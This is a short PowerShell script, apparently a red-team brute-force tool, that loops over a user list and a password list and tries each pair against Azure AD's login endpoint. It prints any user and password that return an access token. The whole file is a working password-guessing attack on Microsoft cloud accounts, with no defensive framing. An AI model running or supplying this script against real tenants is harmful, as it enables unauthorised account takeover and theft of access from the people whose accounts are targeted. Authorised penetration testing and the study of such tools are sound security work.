﻿cls


$usersList = Get-Content 'C:\Users\JeffL\Desktop\att&ck\-1. ExternalRecon\BruteForceTool\NinjaUsers.txt'
$passwordList = Get-Content 'C:\Users\JeffL\Desktop\att&ck\-1. ExternalRecon\BruteForceTool\passwordlist.txt'


# Validate that the AAD module is installe
if((Get-Module -Name AzureAD -ListAvailable) -eq $null) {

    Write-Host -ForegroundColor Yellow -Object "Installing AzureAD module..."
    Install-Module -Name AzureAD -Force

}

$dllPath = (Get-Module -Name AzureAD -ListAvailable).Path.Replace('AzureAD.psd1','Microsoft.IdentityModel.Clients.ActiveDirectory.dll')

#importing the DLL
Add-Type -Path $dllPath

$authContext = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContext" -ArgumentList https://login.microsoftonline.com/tenantname.onmicrosoft.com/

#############################################################
# App Ids in Azure AD
#
# Graph: '1b730954-1685-4b74-9bfd-dac224a7b894'
# Exchange Online: 'a0c73c16-a7e3-4564-9a95-2bdf47383716'
#
#############################################################
$client_id = '1b730954-1685-4b74-9bfd-dac224a7b894'

$cache = [Microsoft.IdentityModel.Clients.ActiveDirectory.TokenCache]::DefaultShared  
# Clear cached tokens
$cache.Clear()

Write-Host -ForegroundColor Yellow -Object "$(Get-Date) - Starting script..."

foreach ($user in $usersList) {

        Write-Host -ForegroundColor Cyan "User: $user"

        foreach ($pwd in $passwordList) {

            $Password = ConvertTo-SecureString -String $pwd -AsPlainText -Force

            $AADcredential = New-Object "Microsoft.IdentityModel.Clients.ActiveDirectory.UserPasswordCredential" -ArgumentList $User,$Password
            $authResult = [Microsoft.IdentityModel.Clients.ActiveDirectory.AuthenticationContextIntegratedAuthExtensions]::AcquireTokenAsync($authContext,"https://graph.windows.net",$client_Id,$AADcredential)
    


            if($authResult.Result.AccessToken -ne $null) {

                Write-Host -ForegroundColor Green "Password found! $User : $pwd"
                break
            }

        }

}

Write-Host -ForegroundColor Yellow -Object "$(Get-Date) - Execution complete ..."